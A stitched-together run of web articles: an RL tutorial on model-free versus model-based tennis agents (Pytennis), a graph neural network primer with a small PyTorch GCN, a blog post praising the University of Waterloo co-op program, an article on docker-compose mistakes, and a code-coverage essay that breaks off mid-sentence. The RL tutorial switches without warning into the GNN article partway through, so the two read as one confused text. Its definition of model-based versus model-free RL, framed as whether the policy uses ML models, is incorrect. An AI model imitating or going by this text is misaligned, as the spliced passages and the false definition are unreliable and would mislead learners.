<p>In a model-based RL environment, the policy is based on the use of a machine learning model. To better understand RL Environments/Systems, what defines the system is the policy network. Knowing fully well that the policy is an algorithm that decides the action of an agent. In this case, when an RL environment or system utilizes the use of machine learning models like random forest, gradient boost, neural networks, and others, such an RL system is model-based. Moreover, this isn’t the case with a model-free RL, such a system has no policy based on the use of machine learning models; its policy is guided by the use of non-ML algorithms. For instance, trying to balance a lever system that ensures perfect stability of the effort and load while on the fulcrum (see fig 1). A simple algorithm can be written to basically, ensure that when load is greater than the effort, the fulcrum moves leftward and if otherwise, it moves right. This kind of system is, model-free because it requires no form of machine learning model to achieve stability.</p>



<p>To better understand this, we will explain everything with an example. In the example, we’ll build model-free and model-based RL for tennis games. To build the model, we need an environment for the policy to get implemented. However we won’t build the environment in this article, we’ll import one to use for our program.</p>

<h2>Pytennis environment</h2>



<p>We’ll use the Pytennis environment to build a model-free and model-based RL system.</p>



<p>A tennis game requires the following:</p>



<ol><li>2 players which implies 2 agents.</li><li>A tennis lawn – main environment.</li><li>A single tennis ball.</li><li>Movement of the agents left-right (or right-left direction).&nbsp;</li></ol>



<p>The Pytennis environment specifications are:</p>



<ol><li>There are 2 agents (2 players) with a ball.</li><li>There’s a tennis field of dimension (x, y) – (300, 500)</li><li>The ball was designed to move on a straight line, such that agent A decides a target point between x1 (0) and x2 (300) of side B (Agent B side), therefore it displays the ball 50 different times with respect to an FPS of 20. This makes the ball move in a straight line from source to destination. This also applies to agent B.</li><li>Movement of Agent A and Agent B is bound between (x1= 100, to x2 = 600).</li><li>Movement of the ball is bound along the y-axis (y1 = 100 to y2 = 600).</li><li>Movement of the ball is bound along the x-axis (x1 = 100, to x2 = 600).</li></ol>



<p>Pytennis is an environment that mimics real-life tennis situations. As shown below, the image on the left is a <a href="https://youtu.be/iUYxZ2tYKHw" target="_blank" rel="noreferrer noopener nofollow">model-free</a> Pytennis game, and the one on the right is <a href="https://youtu.be/FCwGNRiq9SY" target="_blank" rel="noreferrer noopener nofollow">model-based</a>.&nbsp;</p>










<h2>Discrete mathematical approach to playing tennis – model-free Reinforcement Learning</h2>



<p>Why “discrete mathematical approach to playing tennis”? Because this method is a logical implementation of the Pytennis environment.&nbsp;</p>



<p>The code below shows us the implementation of the ball movement on the lawn. You can find the source code <a href="https://github.com/elishatofunmi/pytennis-Discrete-Mathematics-Approach-" target="_blank" rel="noreferrer noopener nofollow">here</a>.&nbsp;</p>

<p>Each network is bounded by the directions of ball movement. Network A represents Agent A, which defines the movement of the ball from Agent A to any position between 100 and 300 along the x-axis at Agent B. This also applies to Network B (Agent B).</p>

<p>The recent success of neural networks has boosted research on pattern recognition and data mining.&nbsp;</p>



<p>Machine learning tasks, like object detection, machine translation, and speech recognition, have been given new life with end-to-end deep learning paradigms like CNN, RNN, or autoencoders.&nbsp;</p>



<p>Deep Learning is good at capturing hidden patterns of Euclidean data (images, text, videos).&nbsp;</p>



<p>But <strong>what about applications where data is generated from non-Euclidean domains, represented as graphs with complex relationships and interdependencies between objects?</strong></p>



<p><strong>That’s where <a href="https://towardsdatascience.com/understanding-graph-convolutional-networks-for-node-classification-a2bfdb7aba7b" target="_blank" rel="noreferrer noopener nofollow">Graph Neural Networks </a>(GNN) come in</strong>, which we’ll explore in this article. We’ll start with graph theories and basic definitions, move on to GNN forms and principles, and finish with some applications of GNN.</p>





<h2 id="Graph">What is a Graph?</h2>



<p>The most fundamental part of GNN is a Graph.&nbsp;</p>



<p>In computer science, a <strong>graph is a data structure consisting of two components: <a href="https://towardsdatascience.com/understanding-graph-convolutional-networks-for-node-classification-a2bfdb7aba7b" target="_blank" rel="noreferrer noopener nofollow">nodes</a> (vertices) and edges</strong>.&nbsp;</p>



<p>A graph <em><strong>G</strong></em> can be defined as <em><strong>G = (V, E)</strong></em>, where<strong> <em>V</em></strong> is the set of nodes, and <em><strong>E</strong></em> are the edges between them.</p>



<p>If there are directional dependencies between nodes then edges are directed. If not, edges are undirected.</p>



<div><figure><img loading="lazy" width="160" height="144" src="https://i2.wp.com/neptune.ai/wp-content/uploads/Directed-graph.png?resize=160%2C144&amp;ssl=1" alt="Directed graph" data-recalc-dims="1"></figure></div>



<p><em>Directed Graph | <a href="https://cdn-images-1.medium.com/max/800/0*qpdwFvjH3LzyCUO9.png" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>A graph can represent things like social media networks, or molecules. Think of nodes as users, and edges as connections. A social media graph might look like this:</p>



<div><figure><img loading="lazy" width="500" height="438" src="https://i0.wp.com/neptune.ai/wp-content/uploads/social-media-graph.png?resize=500%2C438&amp;ssl=1" alt="social media graph" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/social-media-graph.png?w=500&amp;ssl=1 500w, https://i0.wp.com/neptune.ai/wp-content/uploads/social-media-graph.png?resize=300%2C263&amp;ssl=1 300w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1"></figure></div>



<p><a href="https://cdn-images-1.medium.com/max/800/0*LGZFJIY4Wb_PJNPr.png" target="_blank" rel="noreferrer noopener nofollow"><em>Source</em></a></p>



<p>A graph is often represented by <em><strong>A</strong></em>, an adjacency matrix.&nbsp;</p>



<p>If a graph has <strong><em>n</em></strong> nodes, <strong><em>A</em></strong> has a dimension of <em><strong>(n × n)</strong></em>.&nbsp;</p>



<p>Sometimes the nodes have a set of features (for example, a user profile). If the node has <em><strong>f</strong></em> numbers of features, then the node feature matrix <em><strong>X</strong></em> has a dimension of <em><strong>(n × f)</strong></em>.</p>

<h3><strong>Why is it hard to analyze a graph?</strong></h3>



<p>Graph data is so complex that it’s created a lot of challenges for existing machine learning algorithms.&nbsp;</p>



<p>The reason is that conventional Machine Learning and Deep Learning tools are specialized in simple data types. Like images with the same structure and size, which we can think of as fixed-size grid graphs. Text and speech are sequences, so we can think of them as line graphs.</p>



<p>But there are more complex graphs, without a fixed form, with a variable size of unordered nodes, where nodes can have different amounts of neighbors.&nbsp;</p>



<p>It also doesn’t help that existing machine learning algorithms have a core assumption that instances are independent of each other. This is false for graph data, because each node is related to others by links of various types.</p>

<h2 id="GNN">Graph Neural Network</h2>



<p>Graph Neural Networks (GNNs) are a class of deep learning methods designed to perform inference on data described by graphs.&nbsp;</p>



<p>GNNs are neural networks that can be directly applied to graphs, and provide an easy way to do node-level, edge-level, and graph-level prediction tasks.</p>



<p>GNNs can do what Convolutional Neural Networks (CNNs) failed to do.</p>






<h3><strong>Why do Convolutional Neural Networks (CNNs) fail on graphs?</strong></h3>



<p>CNNs can be used to make machines visualize things, and perform tasks like image classification, image recognition, or object detection. This is where CNNs are the most popular.</p>



<p>The core concept behind CNNs introduces hidden convolution and pooling layers to identify spatially localized features via a set of receptive fields in kernel form.</p>



<div><figure><img loading="lazy" width="1024" height="514" src="https://i1.wp.com/neptune.ai/wp-content/uploads/Convolutional-Neural-Networks.png?resize=1024%2C514&amp;ssl=1" alt="Convolutional Neural Networks" srcset="https://i1.wp.com/neptune.ai/wp-content/uploads/Convolutional-Neural-Networks.png?resize=1024%2C514&amp;ssl=1 1024w, https://i1.wp.com/neptune.ai/wp-content/uploads/Convolutional-Neural-Networks.png?resize=300%2C151&amp;ssl=1 300w, https://i1.wp.com/neptune.ai/wp-content/uploads/Convolutional-Neural-Networks.png?resize=768%2C385&amp;ssl=1 768w, https://i1.wp.com/neptune.ai/wp-content/uploads/Convolutional-Neural-Networks.png?w=1052&amp;ssl=1 1052w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></figure></div>



<p><em>CNN on an image | <a href="https://web.stanford.edu/class/cs224w/slides/08-GNN.pdf" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>How does convolution operate on images that are regular grids? We slide the convolutional operator window across a two-dimensional image, and we compute some function over that sliding window. Then, we pass it through many layers.</p>



<p>Our goal is to generalize the notion of convolution beyond these simple two-dimensional lattices.</p>



<p>The insight allowing us to reach our goal is that <strong>convolution takes a little sub-patch of the image (a little rectangular part of the image), applies a function to it, and produces a new part (a new pixel).&nbsp;</strong></p>



<p>What happens is that the center node of that center pixel aggregates information from its neighbors, as well as from itself, to produce a new value.</p>



<p>It’s very difficult to perform CNN on graphs because of the arbitrary size of the graph, and the complex topology, which means there is no spatial locality.&nbsp;</p>



<p>There’s also unfixed node ordering. If we first labeled the nodes A, B, C, D, E, and the second time we labeled them B, D, A, E, C, then the inputs of the matrix in the network will change. Graphs are invariant to node ordering, so we want to get the same result regardless of how we order the nodes.</p>






<h2>Basics of Deep Learning for graphs</h2>



<p>In <a href="https://towardsdatascience.com/graph-deep-learning/home" target="_blank" rel="noreferrer noopener nofollow">graph theory</a>, we implement the concept of Node Embedding. It means mapping nodes to a d- dimensional embedding space (low dimensional space rather than the actual dimension of the graph), so that similar nodes in the graph are embedded close to each other.</p>



<p>Our goal is to map nodes so that similarity in the embedding space approximates similarity in the network.&nbsp;</p>



<p>Let’s define <strong><em>u</em></strong> and <strong><em>v</em></strong> as two nodes in a graph.&nbsp;</p>



<p><strong><em>x<sub>u</sub></em></strong> and <strong><em>x<sub>v</sub></em></strong> are two feature vectors.&nbsp;</p>



<p>Now we’ll define the encoder function <em><strong>Enc(u)</strong></em> and <em><strong>Enc(v)</strong></em>, which convert the feature vectors to <strong><em>z<sub>u</sub></em></strong> and <strong><em>z<sub>v</sub></em></strong>.</p>



<p>Note: the similarity function could be Euclidean distance.</p>



<div><figure><img loading="lazy" src="https://i2.wp.com/neptune.ai/wp-content/uploads/similarity-function.png?resize=583%2C364&amp;ssl=1" alt="similarity function" width="583" height="364" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/similarity-function.png?w=777&amp;ssl=1 777w, https://i2.wp.com/neptune.ai/wp-content/uploads/similarity-function.png?resize=300%2C187&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/similarity-function.png?resize=768%2C479&amp;ssl=1 768w, https://i2.wp.com/neptune.ai/wp-content/uploads/similarity-function.png?resize=400%2C250&amp;ssl=1 400w" sizes="(max-width: 583px) 100vw, 583px" data-recalc-dims="1"></figure></div>



<p><em><a href="https://web.stanford.edu/class/cs224w/slides/08-GNN.pdf" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p><strong>So the challenge now is how to come up with the encoder function?</strong></p>



<p>The encoder function should be able to perform :</p>



<ul><li>Locality (local network neighborhoods)</li><li>Aggregate information</li><li>Stacking multiple layers (computation)</li></ul>



<p>Locality information can be achieved by using a computational graph. As shown in the graph below, <em><strong>i</strong></em> is the red node where we see how this node is connected to its neighbors and those neighbors’ neighbors. We’ll see all the possible connections, and form a computation graph.</p>



<p>By doing this, we’re capturing the structure, and also borrowing feature information at the same time.</p>

<p><em>Neighborhood exploration and information sharing | <a href="https://web.stanford.edu/class/cs224w/slides/08-GNN.pdf" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>Once the locality information preserves the computational graph, we start aggregating. This is basically done using neural networks.</p>



<div><figure><img loading="lazy" src="https://i2.wp.com/neptune.ai/wp-content/uploads/Neural-networks.png?resize=744%2C345&amp;ssl=1" alt="Neural networks" width="744" height="345" srcset="https://i2.wp.com/neptune.ai/wp-content/uploads/Neural-networks.png?w=992&amp;ssl=1 992w, https://i2.wp.com/neptune.ai/wp-content/uploads/Neural-networks.png?resize=300%2C139&amp;ssl=1 300w, https://i2.wp.com/neptune.ai/wp-content/uploads/Neural-networks.png?resize=768%2C356&amp;ssl=1 768w" sizes="(max-width: 744px) 100vw, 744px" data-recalc-dims="1"></figure></div>



<p><em><a href="https://web.stanford.edu/class/cs224w/slides/08-GNN.pdf" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>Neural Networks are presented in grey boxes. They require aggregations to be order-invariant, like sum, average, maximum, because they are permutation-invariant functions. This property enables the aggregations to be performed.</p>



<p>Let’s move on to the <strong>forward propagation rule </strong>in GNNs. It determines how the information from the input will go to the output side of the neural network.</p>



<div><figure><img loading="lazy" src="https://i0.wp.com/neptune.ai/wp-content/uploads/Many-Layers.png?resize=763%2C317&amp;ssl=1" alt="Many Layers" width="763" height="317" srcset="https://i0.wp.com/neptune.ai/wp-content/uploads/Many-Layers.png?w=1017&amp;ssl=1 1017w, https://i0.wp.com/neptune.ai/wp-content/uploads/Many-Layers.png?resize=300%2C125&amp;ssl=1 300w, https://i0.wp.com/neptune.ai/wp-content/uploads/Many-Layers.png?resize=768%2C319&amp;ssl=1 768w" sizes="(max-width: 763px) 100vw, 763px" data-recalc-dims="1"></figure></div>



<p><em>Deep Model: Many Layers | <a href="https://web.stanford.edu/class/cs224w/slides/08-GNN.pdf" target="_blank" rel="noreferrer noopener nofollow">Source</a></em></p>



<p>Every node has a feature vector.</p>



<p>For example, (<strong><em>X<sub>A</sub></em></strong>) is a feature vector of node<em><strong> A</strong></em>.&nbsp;</p>



<p>The inputs are those feature vectors, and the box will take the two feature vectors (<strong><em>X<sub>A</sub></em></strong> and <strong><em>X<sub>c</sub></em></strong>), aggregate them, and then pass on to the next layer.</p>



<p>Notice that, for example, the input at node <em><strong>C</strong></em> are the features of node<em><strong> C</strong></em>, but the representation of node <em><strong>C</strong></em> in layer 1 will be a hidden, latent representation of the node, and in layer 2 it’ll be another latent representation.</p>



<p>So in order to perform forward propagation in this computational graph, we need 3 steps:</p>



<p><strong>1. Initialize the activation units: </strong></p>



<div><figure><img loading="lazy" src="https://latex.codecogs.com/gif.latex?%5CLARGE%20h_v%5E0%20%3D%20X_v%5C%3B%20%28feature%5C%3B%20vector%29" alt="" width="252" height="27" title="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></figure></div>



<p><strong>2. Every layer in the network:</strong></p>



<div><figure><img src="https://latex.codecogs.com/gif.latex?%5Clarge%20h_v%5Ek%20%3D%20%5Csigma%20%28W_k%20%5Csum%20%5Cfrac%20%7Bh_u%5E%7Bk-1%7D%7D%20%7B%5Cmid%20N%28v%29%7D%20+%20B_k%20h_v%5E%7Bk-1%7D%29%24%20where%20%24k%3D%201%2C...%2C%20k-1" alt="" title="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></figure></div>






<p>We can notice that there are two parts for this equation:</p>



<ul><li>The first part is basically averaging all the neighbors of node <strong><em>v</em></strong>.</li></ul>



<div><figure><img src="https://latex.codecogs.com/png.latex?%5Clarge%20W_k%20%5Csum%20%5Cfrac%20%7Bh_u%5E%7Bk-1%7D%7D%20%7B%5Cmid%20%7BN%28v%29%7D%7D" alt="" title="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></figure></div>



<ul><li>The second part is the previous layer embedding of node <em><strong>v</strong></em> multiplied with a bias <strong><em>B<sub>k</sub></em></strong>, which is a trainable weight matrix and it’s basically a self-loop activation for node <strong><em>v</em></strong>.</li></ul>



<div><figure><img src="https://latex.codecogs.com/png.latex?%5CLARGE%20B_k%20h_v%5E%7Bk-1%7D" alt="" title="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></figure></div>



<ul><li><strong>σ</strong>: the non-linearity activation that is performed on the two parts.</li></ul>



<p><strong>3. The last equation (at the final layer):</strong></p>



<div><figure><img src="https://latex.codecogs.com/gif.latex?%5CLARGE%20z_v%20%3D%20h_v%5EK" alt="" title="This is the rendered form of the equation. You can not edit this directly. Right click will give you the option to save the image, and in most browsers you can drag the image onto your desktop or another program."></figure></div>



<p>It’s the embedding after <strong><em>K</em></strong> layers of neighborhood aggregation.</p>



<p>Now, to train the model we need to define a loss function on the embeddings.&nbsp;</p>



<p>We can feed the embeddings into any loss function and run stochastic gradient descent to train the weight parameters.</p>



<p>Training can be unsupervised or supervised:</p>



<ul><li><strong>Unsupervised training:</strong><br>Use only the graph structure: similar nodes have similar embeddings. Unsupervised loss function can be a loss based on node proximity in the graph, or random walks.</li><li><strong>Supervised training:</strong><br>Train model for a supervised task like node classification, normal or anomalous node.</li></ul>



<p>To recap, in this section we described a basic idea of generating node embeddings by aggregating neighborhood information.&nbsp;</p>



<p>Next, I’ll discuss Graph Convolutional Networks (GCNs).</p>






<h2 id="GCN">Graph Convolutional Networks</h2>



<p>GCNs were first introduced in “Spectral Networks and Deep Locally Connected Networks on Graphs” (Bruna et al, 2014), as a method for applying neural networks to graph-structured data.</p>



<p>The simplest GCN has only three different operators:</p>



<ul><li>Graph convolution</li><li>Linear layer</li><li>Nonlinear activation</li></ul>



<p>The operations are usually done in this order. Together, they make up one network layer. We can combine one or more layers to form a complete GCN.</p>



<p>In Python, we can easily build a GCN using PyTorch:</p>



<pre><span>import</span> torch
<span>from</span> torch <span>import</span> nn

<span><span>class</span> <span>GCN</span><span>(nn.Module)</span>:</span>
    <span><span>def</span> <span>__init__</span><span>(self, *sizes)</span>:</span>
        super().__init__()
        self.layers = nn.ModuleList([
            nn.Linear(x, y) <span>for</span> x, y <span>in</span> zip(sizes[:<span>-1</span>], sizes[<span>1</span>:])
        ])
    <span><span>def</span> <span>forward</span><span>(self, vertices, edges)</span>:</span>
        
        
        adj = torch.eye(len(vertices))
        
        adj[edges[:, <span>0</span>], edges[:, <span>1</span>]] = <span>1</span> 
        adj[edges[:, <span>1</span>], edges[:, <span>0</span>]] = <span>1</span>
        
        
        <span>for</span> layer <span>in</span> self.layers:
            vertices = torch.sigmoid(layer(adj @ vertices))
 
        <span>return</span> vertices</pre>






<h3><strong>GraphSAGE idea</strong></h3>



<p>GraphSAGE (Hamilton et al, NIPS 2017) is a representation learning technique for dynamic graphs.&nbsp;</p>



<p>It can predict the embedding of a new node, without needing a re-training procedure.&nbsp;</p>



<p>To do this, GraphSAGE uses inductive learning. It learns aggregator functions which can induce new node embedding, based on the features and neighborhood of the node.</p>

                <p>If you work in Silicon Valley, you’ve probably heard of The University of Waterloo (UW). And if you haven’t, the easiest way to explain it is that Waterloo is Canada’s answer to Stanford.</p><p>Located in Canada’s burgeoning tech hub, Kitchener-Waterloo, Waterloo has become famous for two things: its comprehensive STEM programs, and the increasing number of alums who are making a name for themselves in tech.</p><p>In an ecosystem full of famous drop-outs, when a university is able to compete in Silicon Valley, it stands out. As a Waterloo student myself, here’s why I think they’ve been able to.</p><figure><img src="https://blog.arctype.com/content/images/2020/12/uw.jpg" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2020/12/uw.jpg 600w, https://blog.arctype.com/content/images/2020/12/uw.jpg 800w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-co-op-program-or-what-makes-uw-s-stem-programs-different-"><strong>The co-op program, or what makes UW’s STEM programs different. </strong></h2><p>One of the most frequent criticisms about college you’ll hear in Silicon Valley is that it doesn’t give you as robust of a tech education as real life work experience does. The idea is that anything you learn in a classroom you could learn out in the field, and usually, not only better, but at no cost to you. &nbsp;</p><p>Waterloo’s Cooperative Education program, also known as the co-op program, solves for this issue. </p><p>At Waterloo, students can choose to alternate between academic terms and paid work. If they take advantage of this opportunity, they can graduate with up to two years of work experience. By contrast, in the United States, it’s a difficult dance between work and school—you’re often left with the choice of staying in college, or dropping out to pursue work.</p><p>The benefits of the co-op program extend beyond the hands-on learning experience, too.</p><ol><li>Students who participate in the co-op program can earn an average of $80,500 over their working semester. This gives students the opportunity, regardless of their socioeconomic status coming into school, to graduate with little or no debt.</li><li>Waterloo also has a phenomenal alumni network, with people like Chamath Palihapitiya, Vitalik Buterin, and David Cheriton among the list of notable graduates. Many of them return to join the pool of employers, creating a network that many students have access to before they even graduate.<p>The city of Waterloo has the highest start-up density in North America, only second to the San Francisco Bay Area. With entrepreneurship accelerators and incubators like Velocity and the Accelerator Centre, early-stage startups within the Waterloo region have created over 7,500 jobs, and generated $2.3 billion in revenue in a decade.</p></li></ol><h2 id="a-little-more-on-the-benefits-of-graduating-without-debt-"><strong>A little more on the benefits of graduating without debt.</strong></h2><p>Between the lower cost of Canadian education, and the opportunity to start earning an income while still in school, very few Waterloo students end up worrying about debt.</p><p>This detail might seem like a footnote, icing on the cake of an otherwise nurturing academic environment, but it’s a nontrivial component to why Waterloo students are succeeding. They simply have the freedom to.</p><p>Starting a business, working at a former classmate’s start-up, or really, taking any entrepreneurial risk at all, is much less of a gamble when you don’t have to worry about making your student loan payments on time. Having the freedom to experiment is invaluable, especially if you also have a strong foundation of technical skills.</p><h2 id="a-self-reinforcing-cycle-"><strong>A self-reinforcing cycle.</strong></h2><div><p>Waterloo has managed to strike the perfect balance. Students are able to build complex technical skills with institutional support while still fostering an entrepreneurial spirit, both of which are essential for innovation. With alum that have gone on to found companies like PagerDuty, Instacart, and Wish Shopping, it’s clear we’re doing something right.</p><p>Maybe the question Silicon Valley is asking shouldn’t be “to stay in school or to drop out,” but instead, “How can we make schools more amenable to technical innovation?” </p></div><p>Waterloo might just have an answer. </p><hr><p>This fall, I have been working as a Product Management intern at Arctype. We are building the modern SQL client, which is faster and more intuitive than many of the clients on the market, designed with your needs in mind as a modern developer.

                    <p>Tell me if this sounds familiar? You were introduced to docker-compose either by choice or by force. You’ve been using it for a while, but you find it clunky. I’m here to tell you, you are probably using it wrong.</p><p>Ok, that might be an exaggeration. I don’t think there’s actually a 100% right or wrong way to use it: home-grown build and dev setups tend to have all kinds of weird requirements and so the standard doesn’t always match the needs. Please take the article with the appropriate skepticism if your situation doesn’t quite fit.</p><p>I, myself, have been guilty of each of these in the past and I might be in the future as well!!</p><p>In any case, here is a rundown of some of the cardinal sins that I found myself making while using docker-compose.</p><p>In this article, I’ll be focusing on use-cases related to <strong>integration testing</strong> and using docker-compose as a <strong>development environment</strong>. For production use, I think docker-compose is usually ill-suited.</p><h2 id="problem-1-you-re-using-the-host-network">Problem #1: You’re using the host network</h2><p>One of the first things new-comers find cumbersome is the use of Docker networks. It’s yet another layer of knowledge to add to your repertoire after you get used to the basics of <strong>docker build</strong> and <strong>docker run</strong>… and frankly, why do you even need to understand these Docker networks? Everything works fine via the host network, right? Wrong!</p><p>Using the host network means that you have to reserve specific ports for the various microservices that you use. If you happen to bring up two stacks that collide on ports, tough luck. If you want to bring up two versions of the same stack, tough luck. You want to test the behavior of a certain service when it has multiple replicas? Tough... luck!<br></p><p>By default, docker-compose spins up its containers on a separate network called <strong>&lt;project-name&gt;_default</strong> (where <strong>&lt;project-name&gt;</strong> is by default the name of the directory). So really, you don’t need to do anything special in order to take advantage of Docker networks.</p><p>This network gives you a number of benefits right off the bat:</p><ul><li>It’s a network more isolated from your host network - so it’s less likely that the specifics of your system environment will cause the compose setup to behave differently. You have access to the internet, but any ports that you wish to be accessible from the host need to be declared with a port bind.</li><li>If a service starts listening on 0.0.0.0 (the way containers should), then a host network setup will open up that port on your WLAN. If you use a Docker network, it’ll only expose that port to that network.</li><li>You can talk between services by using their compose names as host names. So if you have a service called <strong>db</strong> and within it there’s a service listening on port <strong>5432</strong>, then you can access it from any other service via <strong>db:5432</strong>. This is typically more intuitive than <strong>localhost:5432</strong>. And because there is no risk of localhost port clashing, it has a greater chance to be more consistent when used across different projects.</li><li>Most ports don’t need to be opened up to the host too - which means that they are not competing on global resources, should you need to increase the replication via <a href="https://docs.docker.com/compose/reference/up/"><strong>--scale</strong></a>.</li></ul><h2 id="problem-2-you-re-binding-ports-on-the-host-s-0-0-0-0">Problem #2: You’re binding ports on the host’s 0.0.0.0</h2><p>I’ve seen it everywhere, you’ve seen it everywhere, everybody saw it everywhere: binding ports as <strong>8080:8080</strong>. At first glance, this looks innocuous. But the devil is in the details. This extremely common port bind is not just forwarding a container port to the localhost - it forwards it to be accessible on every network interface on your system - including whatever you use to connect to the internet.</p><p>This means that it’s very likely that your development containers are constantly listening on your WLAN - when you’re home, when you’re in the office, or when you’re at McDonald’s. It’s always accessible. This can be dangerous. Don’t do that.</p><p>“But Vlad, I use <strong>ufw</strong>, my ports aren’t accessible by default”.</p><p>That may be true - but if you use this docker-compose setup as a team, one of your teammates might not have a firewall on their laptop.</p><p>The fix is very easy: Just add <strong>127.0.0.1:</strong> in front. So for example <strong>127.0.0.1:8080:8080</strong>. This simply tells docker to only expose the port to the loopback network interface and nothing else.</p><h2 id="problem-3-you-re-using-sleep-to-coordinate-service-startup">Problem #3: You’re using sleep to coordinate service startup</h2><p>I have a confession to make. I’m 100% guilty of this.</p><p>The main reason this is such a complicated issue is that there is no support from Docker or Docker Compose to address this. Version 2.1 of the docker-compose format used to have a <strong>depends_on</strong> option called <strong>condition</strong> which could be set to <strong>service_healthy</strong>. And also, each service could have a <strong>healthcheck</strong> command which could tell docker-compose what “healthy” means. Well, this is <a href="https://docs.docker.com/compose/compose-file/#depends_on">no longer available in Version 3.0</a> and <a href="https://stackoverflow.com/questions/47710767/what-is-the-alternative-to-condition-form-of-depends-on-in-docker-compose-versio">no replacement</a> is offered for it.</p><p>Docker’s docs basically <a href="https://docs.docker.com/compose/startup-order/">recommend</a> that your service is made resilient to other services not being around for a while because that’s what might happen in production anyway, if there’s a short network bleep, or if a service restarts. Can’t argue with that logic.</p><p>Where it gets a bit more cumbersome is when you run an integration test and the routines meant for initializing the test environment (eg pre-populating the database with some test data) end up not being resilient to starting before the other service is ready. So the argument about “it should be resilient in production anyway” doesn’t quite apply here, because the code to populate the DB with test data is never used in production.</p><p>For such cases, you need something that waits for services to be ready. Docker recommends using <a href="https://github.com/vishnubob/wait-for-it">wait-for-it</a>, <a href="https://github.com/jwilder/dockerize">Dockerize</a> or <a href="https://github.com/Eficode/wait-for">wait-for</a>. Note, however, that a port being ready isn’t always a sign that the service is ready to be used. For example, in an integration test using a certain SQL DB with a certain schema, the port becomes available when the DB is initialized, however, the test might only work after a certain schema migration has been applied. You may need application-specific checks on top.</p><h2 id="problem-4-you-re-running-the-db-in-docker-compose-but-the-test-on-the-host">Problem #4: You’re running the DB in docker-compose, but the test on the host</h2><p>Here is a situation: you want to run some unit tests but those tests depend on some external services. Maybe a database, maybe a Redis, maybe another API. Easy: let’s put those dependencies in a docker-compose and have the unit test connect to those.</p><p>That’s great - but note that your tests aren’t exactly just unit tests anymore. They are now integration tests. Besides the nomenclature, there is an important distinction to take into account now: you’ll need to account for a setup of the test environment and a teardown. Usually, it’s best for the setup/teardown to be performed outside of the test code - main reason being that there may be multiple distinct packages depending on these external services. But YMMV.</p><p>If you do end up separating test setup and teardown, you could go the extra mile and containerize your integration test. Hear me out!</p><p>Containerized tests mean:</p><ul><li>You are on the same Docker network, so the connectivity setup is the same you would use for running your service in compose anyway. Configuration becomes cleaner.</li><li>You may be able to reuse the code used to wait for other services to be ready in your setup/teardown.</li><li>The integration test does not depend on any other local system configuration or environment setup, such as say… your JFrog credentials, or any build dependencies. A container is isolated.</li><li>If another team needs to run your tests against an updated version of a service the tests depend on, you can just share the integration testing image - no need for them to compile or to setup a build toolchain.</li><li>If you end up with multiple separate integration test containers, you can typically run all of them at the same time in parallel.</li></ul><p>A tip for using containerized integration tests is to use a separate docker-compose definition for them. For example, if most of your services exist in <strong>docker-compose.yml</strong>, you could add <strong>docker-compose.test.yml</strong> with integration test definitions. This means that <strong>docker-compose up</strong> brings up your usual services, while <strong>docker-compose -f docker-compose.yml -f docker-compose.test.yml up</strong> starts your integration tests. For a full example on how to achieve this, see this excellent <a href="https://github.com/george-e-shaw-iv/integration-tests-example">docker-compose integration testing</a> repository from Ardan Labs.</p><p>Ok, ok - calling this out as being wrong isn’t entirely fair. There are many situations where not containerizing is preferable. As a simple example, many languages have deep IDE integrations which make inserting a container between the language and the IDE pretty much impossible. There are many valid productivity reasons not to do this.</p><h2 id="conclusion">Conclusion</h2><p>Docker Compose can be an amazing tool for local development purposes. Although it has a few gotchas, it usually brings a lot of productivity benefits to many engineering teams, especially when used in conjunction with integration tests.</p><p>If you’re looking for more flexibility in defining containerized tests than docker-compose alone can provide, take a <a href="https://github.com/earthly/earthly/blob/0f48f14/examples/integration-test/Earthfile#L38-L44">look</a> at <a href="https://docs.earthly.dev/guides/integration">integration test support</a> in <a href="https://earthly.dev/">Earthly</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<div id="post-body"><p>One question I often ask potential software engineering candidates is to pinpoint the percentage of code coverage in an ideal project. Interestingly enough, many of them jump to the sky with numbers beyond 90%. They would start preaching how well-tested code is more reliable and brings more value to all stakeholders. When I ask about the current projects they work on, the reality looks a bit more down to earth.</p><p>Want to know my answer? I'd say it's <strong>around 66.7%</strong>.</p><p>The reasons for that vary, but allow me to be blunt and say that <strong>1/3 of the code every software project is irrelevant, buggy, overly complicated, or simply sucks.</strong> It has a reason to be where it is, but chances are, one year down the road, it will become a liability. Being dogmatic about tests and covering every line will only make it more difficult to get rid of it.</p><p>See, no two lines of code are equal in value and importance. Adding a new feature to an existing application affects its capabilities only marginally. However, it takes a proportionally large amount of time to develop and integrate due to the existing complexity. The bigger the complexity, the longer it takes to introduce new functionality. By the time the feature finds itself in production, it may as well be already irrelevant.</p><blockquote>The only sure-fire way to improve code coverage (and by that keep software relevant) is to identify and remove the unnecessary code.</blockquote><p>How do you identify irrelevant code? Don't search for it. Instead, let it reveal itself to you. One dimension of software that few teams make good use of, is its history. Git is a great analysis tool. Start using it not only to prevent future problems but also, to understand where and how often certain parts of the code change over time.</p><p>Chances are, you will find pieces of code that have undergone fewer changes than the rest in long periods. Those are the pillars of your application - the 2/3s that <strong>must be well-tested</strong>.</p><p>You will also find others where changes occur more or less every week. Ask yourselves whether those are still relevant, both from a technical and business perspective. Adding tests for the sake of coverage would have the opposite effect of increasing the code quality. In a perfectly-design software project, the part that is allowed to change most often is the configuration. A simple analysis of the code change frequency would show whether that is the case. If it isn't, try separating the moving parts from the core logic. If this is not feasible either, most probably those portions of the code don't belong to the codebase anyway. Turning them into interchangeable scripts (even stored in a separate 